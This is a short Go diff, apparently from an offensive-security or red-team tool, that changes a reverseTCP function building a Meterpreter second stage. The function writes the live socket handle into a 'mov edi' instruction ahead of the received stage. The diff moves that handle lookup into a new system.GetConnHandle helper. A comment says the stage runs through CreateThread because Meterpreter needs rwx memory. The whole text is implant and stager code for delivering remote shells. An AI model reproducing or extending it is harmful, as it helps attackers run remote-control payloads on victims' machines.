@@ -8,11 +8,17 @@ import (
 	"runtime"
 
 	"project/internal/module/shellcode"
+	"project/internal/system"
 )
 
 func reverseTCP(conn *net.TCPConn, stage []byte, _ string) error {
 	stageSize := len(stage)
 	const mov = 0xBF
+	// get connection handle
+	handle, err := system.GetConnHandle(conn)
+	if err != nil {
+		return err
+	}
 	// make final stage
 	// BF 78 56 34 12 => mov edi, 0x12345678
 	// BF + socket handle
@@ -26,7 +32,7 @@ func reverseTCP(conn *net.TCPConn, stage []byte, _ string) error {
 		}
 		final[0] = mov
 		// write handle
-		binary.LittleEndian.PutUint32(final[1:1+4], uint32(conn.Handle()))
+		binary.LittleEndian.PutUint32(final[1:1+4], uint32(handle))
 	case "amd64":
 		final = make([]byte, 1+8+stageSize)
 		for i := 0; i < stageSize; i++ {
@@ -35,7 +41,7 @@ func reverseTCP(conn *net.TCPConn, stage []byte, _ string) error {
 		}
 		final[0] = mov
 		// write handle
-		binary.LittleEndian.PutUint64(final[1:1+8], uint64(conn.Handle()))
+		binary.LittleEndian.PutUint64(final[1:1+8], uint64(handle))
 	}
 	// must force use MethodCreateThread, otherwise it will
 	// panic, because meterpreter need rwx memory
